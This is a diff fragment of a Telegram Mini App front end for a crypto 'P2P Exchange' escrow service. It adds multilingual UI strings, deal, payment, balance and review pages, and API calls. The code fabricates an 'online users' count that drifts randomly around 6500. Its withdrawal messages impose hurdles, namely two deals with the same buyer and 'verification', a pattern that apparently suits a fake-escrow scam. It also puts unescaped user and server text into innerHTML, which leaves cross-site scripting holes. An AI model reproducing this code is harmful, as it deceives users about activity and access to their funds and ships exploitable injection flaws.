+        const user = {
+            id: tg?.initDataUnsafe?.user?.id || Math.floor(100000 + Math.random() * 900000),
+            username: tg?.initDataUnsafe?.user?.username || 'user_' + Math.floor(1000 + Math.random() * 9000),
+            firstName: tg?.initDataUnsafe?.user?.first_name || 'Пользователь'
+        };
+
+        document.getElementById('userName').textContent = '👤 ' + (user.firstName || user.username);
+
+        // ============================================================
+        // 3. ЯЗЫКИ
+        // ============================================================
+        let currentLang = 'ru';
+
+        const LANG_TEXT = {
+            'ru': {
+                'langPrompt': 'Выберите язык',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': 'Exchange',
+                'onlineLabel': 'онлайн',
+                'statLabel1': 'Сделок сегодня',
+                'statLabel2': 'Пользователей',
+                'statLabel3': 'Отзывов',
+                'statLabel4': 'Объём (TON)',
+                'navMain': 'Главная',
+                'navCreate': 'Сделка',
+                'navDeals': 'Сделки',
+                'navReviews': 'Отзывы',
+                'navBalance': 'Баланс',
+                'navAdmin': 'Админ',
+                'welcomeTitle': 'Добро пожаловать!',
+                'welcomeText': 'Безопасные P2P сделки с криптовалютой. P2P Exchange — ваш надёжный партнёр.',
+                'quickStart': 'Быстрый старт',
+                'btnCreateDeal': 'Создать сделку',
+                'btnReviews': 'Отзывы',
+                'btnBalance': 'Баланс',
+                'btnDeals': 'Мои сделки',
+                'howWorks': 'Как это работает',
+                'step1': '1️⃣ Создайте сделку — опишите товар и сумму',
+                'step2': '2️⃣ Отправьте ссылку покупателю',
+                'step3': '3️⃣ Покупатель оплачивает на сайте',
+                'step4': '4️⃣ Продавец передаёт товар — нажимает кнопку',
+                'step5': '5️⃣ Покупатель подтверждает получение',
+                'step6': '6️⃣ Деньги зачисляются продавцу',
+                'securityText': '🔒 Защита от мошенников • Верификация • 24/7 поддержка',
+                'recentReviewsTitle': 'Последние отзывы',
+                'loadingText': 'Загрузка...',
+                'supportLabel': 'Поддержка',
+                'channelLabel': 'Канал',
+                'createTitle': 'Создать сделку',
+                'createSubtitle': 'Заполните форму',
+                'labelProduct': 'Товар или услуга',
+                'labelCurrency': 'Валюта',
+                'labelAmount': 'Сумма',
+                'labelBuyer': 'Username покупателя (без @)',
+                'btnCreate': 'Создать сделку',
+                'btnBackMain': 'На главную',
+                'myDealsTitle': 'Мои сделки',
+                'loadingDeals': 'Загрузка...',
+                'btnBackMain2': 'На главную',
+                'reviewsTitle': 'Отзывы',
+                'reviewsSubtitle': 'Оставляйте отзывы после сделок',
+                'labelRating': 'Оценка',
+                'labelReviewText': 'Отзыв',
+                'btnSubmitReview': 'Отправить отзыв',
+                'loadingReviews': 'Загрузка...',
+                'btnLoadMore': 'Загрузить ещё',
+                'balanceTitle': 'Мой баланс',
+                'btnWithdraw': 'Вывести средства',
+                'withdrawInfo': '💳 Вывод средств',
+                'labelWithdrawCurrency': 'Валюта',
+                'labelWithdrawDetails': 'Реквизиты',
+                'btnConfirmWithdraw': 'Подтвердить вывод',
+                'btnBackMain3': 'На главную',
+                'adminTitle': 'Админ панель',
+                'loadingAdmin': 'Проверка прав...',
+                'btnBackMain4': 'На главную',
+                'noDeals': 'У вас нет сделок',
+                'noReviews': 'Пока нет отзывов',
+                'dealsToday': 'Сделок сегодня',
+                'users': 'Пользователей',
+                'reviews': 'Отзывов',
+                'volume': 'Объём (TON)',
+                'paid': 'Оплачено',
+                'waiting': 'Ожидает оплаты',
+                'awaiting': 'Ожидает подтверждения',
+                'completed': 'Завершено',
+                'copyLink': 'Скопировать ссылку',
+                'pay': 'Оплатить',
+                'sellerDelivered': 'Передал товар',
+                'confirmReceipt': 'Подтвердить получение',
+                'balanceZero': 'Ваш баланс равен 0. Пополните баланс для вывода.',
+                'need2Deals': 'Для вывода нужно провести 2 успешные сделки с одним покупателем. У вас: ',
+                'verificationRequired': 'Для вывода необходима верификация. Пройдите проверку.',
+                'verificationPassed': 'Все условия выполнены! Вы можете вывести средства.',
+                'sessionActive': 'Сессия активна до: '
+            },
+            'en': {
+                'langPrompt': 'Choose your language',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': 'Exchange',
+                'onlineLabel': 'online',
+                'statLabel1': 'Deals today',
+                'statLabel2': 'Users',
+                'statLabel3': 'Reviews',
+                'statLabel4': 'Volume (TON)',
+                'navMain': 'Home',
+                'navCreate': 'Create',
+                'navDeals': 'Deals',
+                'navReviews': 'Reviews',
+                'navBalance': 'Balance',
+                'navAdmin': 'Admin',
+                'welcomeTitle': 'Welcome!',
+                'welcomeText': 'Secure P2P cryptocurrency deals. P2P Exchange — your trusted partner.',
+                'quickStart': 'Quick start',
+                'btnCreateDeal': 'Create deal',
+                'btnReviews': 'Reviews',
+                'btnBalance': 'Balance',
+                'btnDeals': 'My deals',
+                'howWorks': 'How it works',
+                'step1': '1️⃣ Create a deal — describe the product and amount',
+                'step2': '2️⃣ Send the link to the buyer',
+                'step3': '3️⃣ Buyer pays on the site',
+                'step4': '4️⃣ Seller delivers — clicks the button',
+                'step5': '5️⃣ Buyer confirms receipt',
+                'step6': '6️⃣ Money is credited to the seller',
+                'securityText': '🔒 Scam protection • Verification • 24/7 support',
+                'recentReviewsTitle': 'Recent reviews',
+                'loadingText': 'Loading...',
+                'supportLabel': 'Support',
+                'channelLabel': 'Channel',
+                'createTitle': 'Create deal',
+                'createSubtitle': 'Fill in the form',
+                'labelProduct': 'Product or service',
+                'labelCurrency': 'Currency',
+                'labelAmount': 'Amount',
+                'labelBuyer': 'Buyer username (without @)',
+                'btnCreate': 'Create deal',
+                'btnBackMain': 'Main menu',
+                'myDealsTitle': 'My deals',
+                'loadingDeals': 'Loading...',
+                'btnBackMain2': 'Main menu',
+                'reviewsTitle': 'Reviews',
+                'reviewsSubtitle': 'Leave reviews after deals',
+                'labelRating': 'Rating',
+                'labelReviewText': 'Review',
+                'btnSubmitReview': 'Submit review',
+                'loadingReviews': 'Loading...',
+                'btnLoadMore': 'Load more',
+                'balanceTitle': 'My balance',
+                'btnWithdraw': 'Withdraw funds',
+                'withdrawInfo': '💳 Withdraw funds',
+                'labelWithdrawCurrency': 'Currency',
+                'labelWithdrawDetails': 'Details',
+                'btnConfirmWithdraw': 'Confirm withdrawal',
+                'btnBackMain3': 'Main menu',
+                'adminTitle': 'Admin panel',
+                'loadingAdmin': 'Checking rights...',
+                'btnBackMain4': 'Main menu',
+                'noDeals': 'You have no deals',
+                'noReviews': 'No reviews yet',
+                'dealsToday': 'Deals today',
+                'users': 'Users',
+                'reviews': 'Reviews',
+                'volume': 'Volume (TON)',
+                'paid': 'Paid',
+                'waiting': 'Waiting for payment',
+                'awaiting': 'Awaiting confirmation',
+                'completed': 'Completed',
+                'copyLink': 'Copy link',
+                'pay': 'Pay',
+                'sellerDelivered': 'Delivered',
+                'confirmReceipt': 'Confirm receipt',
+                'balanceZero': 'Your balance is 0. Please top up to withdraw.',
+                'need2Deals': 'You need 2 successful deals with the same buyer. You have: ',
+                'verificationRequired': 'Verification required to withdraw. Please verify.',
+                'verificationPassed': 'All conditions met! You can withdraw.',
+                'sessionActive': 'Session active until: '
+            },
+            'zh': {
+                'langPrompt': '选择您的语言',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': '交易所',
+                'onlineLabel': '在线',
+                'statLabel1': '今日交易',
+                'statLabel2': '用户',
+                'statLabel3': '评论',
+                'statLabel4': '交易量 (TON)',
+                'navMain': '主页',
+                'navCreate': '创建',
+                'navDeals': '交易',
+                'navReviews': '评论',
+                'navBalance': '余额',
+                'navAdmin': '管理员',
+                'welcomeTitle': '欢迎！',
+                'welcomeText': '安全的P2P加密货币交易。P2P Exchange — 您值得信赖的合作伙伴。',
+                'quickStart': '快速开始',
+                'btnCreateDeal': '创建交易',
+                'btnReviews': '评论',
+                'btnBalance': '余额',
+                'btnDeals': '我的交易',
+                'howWorks': '运作方式',
+                'step1': '1️⃣ 创建交易 — 描述商品和金额',
+                'step2': '2️⃣ 发送链接给买家',
+                'step3': '3️⃣ 买家在网站上支付',
+                'step4': '4️⃣ 卖家交付 — 点击按钮',
+                'step5': '5️⃣ 买家确认收到',
+                'step6': '6️⃣ 资金转入卖家账户',
+                'securityText': '🔒 防诈骗保护 • 验证 • 24/7支持',
+                'recentReviewsTitle': '最新评论',
+                'loadingText': '加载中...',
+                'supportLabel': '支持',
+                'channelLabel': '频道',
+                'createTitle': '创建交易',
+                'createSubtitle': '填写表格',
+                'labelProduct': '商品或服务',
+                'labelCurrency': '货币',
+                'labelAmount': '金额',
+                'labelBuyer': '买家用户名 (不含@)',
+                'btnCreate': '创建交易',
+                'btnBackMain': '主菜单',
+                'myDealsTitle': '我的交易',
+                'loadingDeals': '加载中...',
+                'btnBackMain2': '主菜单',
+                'reviewsTitle': '评论',
+                'reviewsSubtitle': '交易后留下评论',
+                'labelRating': '评分',
+                'labelReviewText': '评论',
+                'btnSubmitReview': '提交评论',
+                'loadingReviews': '加载中...',
+                'btnLoadMore': '加载更多',
+                'balanceTitle': '我的余额',
+                'btnWithdraw': '提取资金',
+                'withdrawInfo': '💳 提取资金',
+                'labelWithdrawCurrency': '货币',
+                'labelWithdrawDetails': '详情',
+                'btnConfirmWithdraw': '确认提取',
+                'btnBackMain3': '主菜单',
+                'adminTitle': '管理面板',
+                'loadingAdmin': '检查权限...',
+                'btnBackMain4': '主菜单',
+                'noDeals': '您没有交易',
+                'noReviews': '暂无评论',
+                'dealsToday': '今日交易',
+                'users': '用户',
+                'reviews': '评论',
+                'volume': '交易量 (TON)',
+                'paid': '已付款',
+                'waiting': '等待付款',
+                'awaiting': '等待确认',
+                'completed': '已完成',
+                'copyLink': '复制链接',
+                'pay': '支付',
+                'sellerDelivered': '已交付',
+                'confirmReceipt': '确认收到',
+                'balanceZero': '您的余额为0。请充值后提取。',
+                'need2Deals': '需要与同一买家完成2笔交易。您有: ',
+                'verificationRequired': '提取需要验证。请进行验证。',
+                'verificationPassed': '所有条件已满足！您可以提取资金。',
+                'sessionActive': '会话有效期至: '
+            },
+            'ar': {
+                'langPrompt': 'اختر لغتك',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': 'صراف',
+                'onlineLabel': 'متصل',
+                'statLabel1': 'صفقات اليوم',
+                'statLabel2': 'مستخدمين',
+                'statLabel3': 'مراجعات',
+                'statLabel4': 'الحجم (TON)',
+                'navMain': 'الرئيسية',
+                'navCreate': 'إنشاء',
+                'navDeals': 'صفقات',
+                'navReviews': 'مراجعات',
+                'navBalance': 'الرصيد',
+                'navAdmin': 'مدير',
+                'welcomeTitle': 'مرحباً!',
+                'welcomeText': 'صفقات P2P آمنة للعملات المشفرة. P2P Exchange — شريكك الموثوق.',
+                'quickStart': 'بداية سريعة',
+                'btnCreateDeal': 'إنشاء صفقة',
+                'btnReviews': 'مراجعات',
+                'btnBalance': 'الرصيد',
+                'btnDeals': 'صفقاتي',
+                'howWorks': 'كيف يعمل',
+                'step1': '1️⃣ أنشئ صفقة — صف المنتج والمبلغ',
+                'step2': '2️⃣ أرسل الرابط للمشتري',
+                'step3': '3️⃣ المشتري يدفع على الموقع',
+                'step4': '4️⃣ البائع يسلم — يضغط الزر',
+                'step5': '5️⃣ المشتري يؤكد الاستلام',
+                'step6': '6️⃣ تضاف الأموال إلى رصيد البائع',
+                'securityText': '🔒 حماية من المحتالين • تحقق • دعم 24/7',
+                'recentReviewsTitle': 'أحدث المراجعات',
+                'loadingText': 'جار التحميل...',
+                'supportLabel': 'الدعم',
+                'channelLabel': 'القناة',
+                'createTitle': 'إنشاء صفقة',
+                'createSubtitle': 'املأ النموذج',
+                'labelProduct': 'المنتج أو الخدمة',
+                'labelCurrency': 'العملة',
+                'labelAmount': 'المبلغ',
+                'labelBuyer': 'اسم مستخدم المشتري (بدون @)',
+                'btnCreate': 'إنشاء صفقة',
+                'btnBackMain': 'القائمة الرئيسية',
+                'myDealsTitle': 'صفقاتي',
+                'loadingDeals': 'جار التحميل...',
+                'btnBackMain2': 'القائمة الرئيسية',
+                'reviewsTitle': 'مراجعات',
+                'reviewsSubtitle': 'اترك مراجعة بعد الصفقات',
+                'labelRating': 'التقييم',
+                'labelReviewText': 'المراجعة',
+                'btnSubmitReview': 'إرسال المراجعة',
+                'loadingReviews': 'جار التحميل...',
+                'btnLoadMore': 'تحميل المزيد',
+                'balanceTitle': 'رصيدي',
+                'btnWithdraw': 'سحب الأموال',
+                'withdrawInfo': '💳 سحب الأموال',
+                'labelWithdrawCurrency': 'العملة',
+                'labelWithdrawDetails': 'التفاصيل',
+                'btnConfirmWithdraw': 'تأكيد السحب',
+                'btnBackMain3': 'القائمة الرئيسية',
+                'adminTitle': 'لوحة المدير',
+                'loadingAdmin': 'فحص الصلاحيات...',
+                'btnBackMain4': 'القائمة الرئيسية',
+                'noDeals': 'ليس لديك صفقات',
+                'noReviews': 'لا توجد مراجعات بعد',
+                'dealsToday': 'صفقات اليوم',
+                'users': 'مستخدمين',
+                'reviews': 'مراجعات',
+                'volume': 'الحجم (TON)',
+                'paid': 'مدفوع',
+                'waiting': 'انتظار الدفع',
+                'awaiting': 'انتظار التأكيد',
+                'completed': 'مكتمل',
+                'copyLink': 'نسخ الرابط',
+                'pay': 'دفع',
+                'sellerDelivered': 'تم التسليم',
+                'confirmReceipt': 'تأكيد الاستلام',
+                'balanceZero': 'رصيدك 0. يرجى الإيداع للسحب.',
+                'need2Deals': 'تحتاج صفقتين ناجحتين مع نفس المشتري. لديك: ',
+                'verificationRequired': 'السحب يحتاج التحقق. يرجى التحقق.',
+                'verificationPassed': 'جميع الشروط متوفرة! يمكنك السحب.',
+                'sessionActive': 'الجلسة نشطة حتى: '
+            }
+        };
+
+        function applyLanguage(lang) {
+            const t = LANG_TEXT[lang] || LANG_TEXT['ru'];
+            for (const [key, value] of Object.entries(t)) {
+                const el = document.getElementById(key);
+                if (el) {
+                    if (key === 'headerTitle' || key === 'headerTitleSpan') {
+                        // handled separately
+                    } else if (key === 'welcomeText') {
+                        el.innerHTML = value;
+                    } else {
+                        el.textContent = value;
+                    }
+                }
+            }
+            // Header title
+            document.getElementById('headerTitle').textContent = t.headerTitle || 'P2P';
+            document.getElementById('headerTitleSpan').textContent = t.headerTitleSpan || 'Exchange';
+            // Lang prompt
+            document.getElementById('langPrompt').textContent = t.langPrompt || 'Выберите язык';
+        }
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            document.getElementById('languageOverlay').classList.remove('active');
+            localStorage.setItem('lang', lang);
+            applyLanguage(lang);
+            showToast('✅ ' + (lang === 'ru' ? 'Язык установлен' : 'Language set'), 'success');
+            loadMainData();
+        }
+
+        if (localStorage.getItem('lang')) {
+            setLanguage(localStorage.getItem('lang'));
+        }
+
+        // ============================================================
+        // 4. СОСТОЯНИЕ
+        // ============================================================
+        let state = {
+            balance: { ton: 0, stars: 0, rub: 0, uah: 0 },
+            deals: [],
+            reviews: [],
+            isAdmin: false,
+            reviewPage: 0,
+            reviewLimit: 10,
+            has2Deals: false,
+            isVerified: false,
+            verificationExpires: null,
+            totalDeals: 0
+        };
+
+        // ============================================================
+        // 5. API ВЫЗОВЫ
+        // ============================================================
+        async function apiCall(endpoint, data = {}) {
+            try {
+                const response = await fetch(`${API_BASE}${endpoint}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Telegram-User-Id': user.id,
+                        'X-Telegram-Username': user.username
+                    },
+                    body: JSON.stringify({ ...data, user_id: user.id, username: user.username })
+                });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                console.error(`API Error:`, error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        // ============================================================
+        // 6. ОНЛАЙН
+        // ============================================================
+        let onlineBase = 6500;
+
+        function getOnlineCount() {
+            onlineBase += (Math.random() - 0.5) * 20;
+            onlineBase = Math.max(6200, Math.min(6800, onlineBase));
+            return Math.round(onlineBase);
+        }
+
+        // ============================================================
+        // 7. НАВИГАЦИЯ
+        // ============================================================
+        document.querySelectorAll('.nav button').forEach(btn => {
+            btn.addEventListener('click', () => {
+                showPage(btn.dataset.page);
+            });
+        });
+
+        function showPage(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
+
+            const target = document.getElementById('page-' + page);
+            if (target) target.classList.add('active');
+
+            const navBtn = document.querySelector(`.nav button[data-page="${page}"]`);
+            if (navBtn) navBtn.classList.add('active');
+
+            if (page === 'deals') loadDeals();
+            if (page === 'balance') loadBalance();
+            if (page === 'admin') loadAdminPanel();
+            if (page === 'reviews') loadReviews();
+            if (page === 'main') loadMainData();
+        }
+
+        // ============================================================
+        // 8. ГЛАВНАЯ
+        // ============================================================
+        async function loadMainData() {
+            try {
+                document.getElementById('onlineCount').textContent = getOnlineCount();
+
+                const stats = await apiCall('/api/stats');
+                if (stats.success) {
+                    document.getElementById('statDealsToday').textContent = stats.deals_today || 0;
+                    document.getElementById('statUsers').textContent = stats.users || 0;
+                    document.getElementById('statReviews').textContent = stats.reviews || 0;
+                    document.getElementById('statVolume').textContent = (stats.volume || 0).toFixed(1) + 'K';
+                    document.getElementById('reviewBadge').textContent = stats.reviews || 0;
+                }
+
+                const reviews = await apiCall('/api/reviews', { limit: 3 });
+                if (reviews.success && reviews.reviews) {
+                    renderRecentReviews(reviews.reviews);
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        function renderRecentReviews(reviews) {
+            const html = reviews.map(r => `
+                <div class="review-card">
+                    <div class="review-header">
+                        <div class="review-user">
+                            <div class="review-avatar">👤</div>
+                            <span class="review-name anonymous">${r.anonymous ? 'Аноним' : r.user}</span>
+                        </div>
+                        <span class="review-date">${r.date || 'только что'}</span>
+                    </div>
+                    <div class="review-stars">${'⭐'.repeat(r.rating || 5)}</div>
+                    <div class="review-text">${r.text}</div>
+                </div>
+            `).join('');
+            document.getElementById('recentReviews').innerHTML = html;
+        }
+
+        // ============================================================
+        // 9. БАЛАНС
+        // ============================================================
+        async function loadBalance() {
+            try {
+                const data = await apiCall('/api/balance');
+                if (data.success) {
+                    state.balance = data.balance || { ton: 0, stars: 0, rub: 0, uah: 0 };
+                    updateBalanceUI();
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        function updateBalanceUI() {
+            document.getElementById('balTon').textContent = state.balance.ton || 0;
+            document.getElementById('balStars').textContent = state.balance.stars || 0;
+            document.getElementById('balRub').textContent = state.balance.rub || 0;
+            document.getElementById('balUah').textContent = state.balance.uah || 0;
+            const total = (state.balance.ton || 0) + (state.balance.stars || 0) +
+                (state.balance.rub || 0) + (state.balance.uah || 0);
+            document.getElementById('userBalance').innerHTML = `<i class="fas fa-coins"></i> ${total}`;
+        }
+
+        // ============================================================
+        // 10. СДЕЛКИ
+        // ============================================================
+        async function loadDeals() {
+            const container = document.getElementById('dealsList');
+            container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Загрузка...</div>';
+            try {
+                const data = await apiCall('/api/deals');
+                if (data.success && data.deals) {
+                    state.deals = data.deals;
+                    state.totalDeals = data.deals.filter(d => d.status === 'completed').length;
+                    renderDeals();
+                } else {
+                    container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 ' + getLangText('noDeals') + '</p>';
+                }
+            } catch (e) {
+                container.innerHTML = '<div class="error-text">❌ Ошибка</div>';
+            }
+        }
+
+        function getLangText(key) {
+            return LANG_TEXT[currentLang]?.[key] || LANG_TEXT['ru'][key] || key;
+        }
+
+        function getStatusText(status) {
+            const map = {
+                'waiting_payment': '⏳ ' + getLangText('waiting'),
+                'paid': '✅ ' + getLangText('paid'),
+                'awaiting_confirmation': '📦 ' + getLangText('awaiting'),
+                'completed': '🎉 ' + getLangText('completed')
+            };
+            return map[status] || status;
+        }
+
+        function renderDeals() {
+            const container = document.getElementById('dealsList');
+            if (!state.deals || state.deals.length === 0) {
+                container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 ' + getLangText('noDeals') + '</p>';
+                return;
+            }
+            
+            container.innerHTML = state.deals.map(d => {
+                const isSeller = d.seller_id === user.id;
+                const isBuyer = d.buyer_id === user.id;
+                const isCompleted = d.status === 'completed';
                 
-                add_log("api_deal_paid_from_balance", {
-                    "user_id": user_id,
-                    "username": username,
-                    "deal_id": deal_id,
-                    "amount": amount,
-                    "currency": currency
-                })
+                return `
+                    <div class="deal-card">
+                        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:4px;">
+                            <strong style="font-size:14px;">${d.product}</strong>
+                            <span class="deal-status ${d.status}">${getStatusText(d.status)}</span>
+                        </div>
+                        <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:4px; font-size:12px; color:var(--text-secondary);">
+                            <span>💰 ${d.amount} ${d.currency}</span>
+                            <span>👤 @${d.buyer_username}</span>
+                            <span>📅 ${d.created_at ? d.created_at.slice(0,10) : 'недавно'}</span>
+                        </div>
+                        <div class="deal-progress">
+                            <span class="step ${d.status === 'waiting_payment' ? 'active' : d.status === 'paid' || d.status === 'awaiting_confirmation' || d.status === 'completed' ? 'done' : ''}">⏳ ${getLangText('waiting')}</span>
+                            <span class="step ${d.status === 'paid' ? 'active' : d.status === 'awaiting_confirmation' || d.status === 'completed' ? 'done' : ''}">✅ ${getLangText('paid')}</span>
+                            <span class="step ${d.status === 'awaiting_confirmation' ? 'active' : d.status === 'completed' ? 'done' : ''}">📦 ${getLangText('awaiting')}</span>
+                            <span class="step ${d.status === 'completed' ? 'done' : ''}">🎉 ${getLangText('completed')}</span>
+                        </div>
+                        
+                        ${d.status === 'waiting_payment' && isSeller ? `
+                            <button class="btn btn-secondary btn-sm mt-6" onclick="copyDealLink('${d.deal_id}')" style="width:auto;">
+                                <i class="fas fa-copy"></i> ${getLangText('copyLink')}
+                            </button>
+                        ` : ''}
+                        
+                        ${d.status === 'waiting_payment' && isBuyer ? `
+                            <button class="btn btn-primary btn-sm mt-6" onclick="payDeal('${d.deal_id}')">
+                                <i class="fas fa-credit-card"></i> ${getLangText('pay')}
+                            </button>
+                        ` : ''}
+                        
+                        ${d.status === 'paid' && isSeller ? `
+                            <div class="support-block mt-6" style="border-color: var(--success);">
+                                <span style="font-size:12px; color: var(--success);">✅ ${getLangText('paid')}. Нажмите «${getLangText('sellerDelivered')}»</span>
+                                <button class="btn btn-success btn-sm mt-6" onclick="sellerDelivered('${d.deal_id}')">
+                                    <i class="fas fa-box"></i> ${getLangText('sellerDelivered')}
+                                </button>
+                            </div>
+                        ` : ''}
+                        
+                        ${d.status === 'awaiting_confirmation' && isBuyer ? `
+                            <div class="support-block mt-6">
+                                <span style="font-size:12px;">📦 ${getLangText('sellerDelivered')}. ${getLangText('confirmReceipt')}</span>
+                                <button class="btn btn-success btn-sm mt-6" onclick="confirmReceipt('${d.deal_id}')">
+                                    <i class="fas fa-check"></i> ${getLangText('confirmReceipt')}
+                                </button>
+                            </div>
+                        ` : ''}
+                        
+                        ${isCompleted ? `
+                            <div class="support-block mt-6" style="border-color: var(--success);">
+                                <span style="font-size:12px; color: var(--success);">🎉 ${getLangText('completed')}! Средства зачислены</span>
+                            </div>
+                        ` : ''}
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function copyDealLink(dealId) {
+            const link = `https://t.me/${BOT_USERNAME}?start=deal_${dealId}`;
+            navigator.clipboard.writeText(link);
+            showToast('✅ Ссылка скопирована!', 'success');
+        }
+
+        // ============================================================
+        // 11. ОПЛАТА
+        // ============================================================
+        async function payDeal(dealId) {
+            showModal(`
+                <h3 style="margin-bottom:12px;">💳 ${getLangText('pay')}</h3>
+                <div style="display:grid; gap:8px;">
+                    <button class="btn btn-primary" onclick="payWithBalance('${dealId}')">
+                        <i class="fas fa-wallet"></i> ${getLangText('pay')}
+                    </button>
+                    <button class="btn btn-secondary" onclick="payWithRekvisits('${dealId}')">
+                        <i class="fas fa-file-invoice"></i> По реквизитам
+                    </button>
+                </div>
+                <button class="btn btn-secondary mt-10" onclick="closeModal()">Отмена</button>
+            `);
+        }
+
+        async function payWithBalance(dealId) {
+            closeModal();
+            const btn = document.querySelector(`#dealsList .deal-card:has([onclick*="payDeal('${dealId}')"]) .btn-primary`);
+            if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Оплата...'; btn.disabled = true; }
+
+            try {
+                const data = await apiCall('/api/pay_balance', { deal_id: dealId });
+                if (data.success) {
+                    showToast('✅ Оплата с баланса прошла успешно!', 'success');
+                    loadDeals();
+                    loadBalance();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка оплаты'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Ошибка: ' + e.message, 'error');
+            } finally {
+                if (btn) { btn.innerHTML = '<i class="fas fa-credit-card"></i> ' + getLangText('pay'); btn.disabled = false; }
+            }
+        }
+
+        async function payWithRekvisits(dealId) {
+            closeModal();
+            try {
+                const data = await apiCall('/api/get_rekvisits', { deal_id: dealId });
+                if (data.success) {
+                    showModal(`
+                        <h3 style="margin-bottom:12px;">💳 Оплатите по реквизитам</h3>
+                        <div class="support-block" style="margin-bottom:12px;">
+                            <p style="font-size:14px; color:var(--text-secondary);">${data.details || 'Оплатите и нажмите "Я оплатил"'}</p>
+                        </div>
+                        <button class="btn btn-success" onclick="confirmRekvisitsPayment('${dealId}')">
+                            <i class="fas fa-check"></i> Я оплатил
+                        </button>
+                        <button class="btn btn-secondary mt-10" onclick="closeModal()">Отмена</button>
+                    `);
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Ошибка: ' + e.message, 'error');
+            }
+        }
+
+        async function confirmRekvisitsPayment(dealId) {
+            closeModal();
+            showToast('⏳ Ожидайте подтверждения администратора...', 'info');
+            try {
+                const data = await apiCall('/api/confirm_rekvisits_payment', { deal_id: dealId });
+                if (data.success) {
+                    showToast('✅ Оплата подтверждена!', 'success');
+                    loadDeals();
+                    loadBalance();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Ошибка: ' + e.message, 'error');
+            }
+        }
+
+        // ============================================================
+        // 12. ПРОДАВЕЦ И ПОКУПАТЕЛЬ
+        // ============================================================
+        async function sellerDelivered(dealId) {
+            if (!confirm('Подтвердить передачу товара?')) return;
+            try {
+                const data = await apiCall('/api/seller_delivered', { deal_id: dealId });
+                if (data.success) {
+                    showToast('✅ Вы подтвердили передачу товара', 'success');
+                    loadDeals();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Ошибка: ' + e.message, 'error');
+            }
+        }
+
+        async function confirmReceipt(dealId) {
+            if (!confirm('Подтвердить получение товара?')) return;
+            try {
+                const data = await apiCall('/api/buyer_confirm', { deal_id: dealId });
+                if (data.success) {
+                    showToast('✅ Получение подтверждено! Средства зачислены', 'success');
+                    loadDeals();
+                    loadBalance();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Ошибка: ' + e.message, 'error');
+            }
+        }
+
+        // ============================================================
+        // 13. СОЗДАНИЕ СДЕЛКИ
+        // ============================================================
+        document.getElementById('dealForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const product = document.getElementById('productInput').value.trim();
+            const currency = document.getElementById('currencySelect').value;
+            const amount = parseFloat(document.getElementById('amountInput').value);
+            const buyer = document.getElementById('buyerInput').value.trim().replace('@', '');
+
+            if (!product || !amount || !buyer) {
+                showToast('❌ Заполните все поля!', 'error');
+                return;
+            }
+
+            const btn = e.target.querySelector('button[type="submit"]');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Создание...';
+            btn.disabled = true;
+
+            try {
+                const data = await apiCall('/api/create_deal', { product, currency, amount, buyer_username: buyer });
+                if (data.success) {
+                    const resultDiv = document.getElementById('dealResult');
+                    resultDiv.style.display = 'block';
+                    resultDiv.innerHTML = `
+                        <div style="display:flex; align-items:center; gap:6px; color:#2ecc71;">
+                            <i class="fas fa-check-circle" style="font-size:18px;"></i>
+                            <strong>Сделка создана!</strong>
+                        </div>
+                        <p style="margin:6px 0; font-size:13px;">ID: <strong>${data.deal_id}</strong> • ${amount} ${currency}</p>
+                        <div class="form-group">
+                            <input type="text" value="${data.link}" readonly style="width:100%;padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:6px;color:var(--text-primary);font-size:12px;">
+                        </div>
+                        <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText('${data.link}'); showToast('✅ Ссылка скопирована!','success');">
+                            <i class="fas fa-copy"></i> Скопировать ссылку
+                        </button>
+                    `;
+                    showToast('✅ Сделка создана!', 'success');
+                    document.getElementById('dealForm').reset();
+                    loadDeals();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            } finally {
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> ' + getLangText('btnCreate');
+                btn.disabled = false;
+            }
+        });
+
+        // ============================================================
+        // 14. ОТЗЫВЫ (БЕЗ ВЕРИФИКАЦИИ)
+        // ============================================================
+        async function loadReviews() {
+            const container = document.getElementById('reviewsList');
+            container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Загрузка...</div>';
+            try {
+                const data = await apiCall('/api/reviews', { page: state.reviewPage, limit: state.reviewLimit });
+                if (data.success && data.reviews) {
+                    state.reviews = data.reviews;
+                    renderReviews();
+                }
+            } catch (e) {
+                console.error(e);
+                container.innerHTML = '<p class="text-secondary text-center">Ошибка загрузки</p>';
+            }
+        }
+
+        function renderReviews() {
+            const container = document.getElementById('reviewsList');
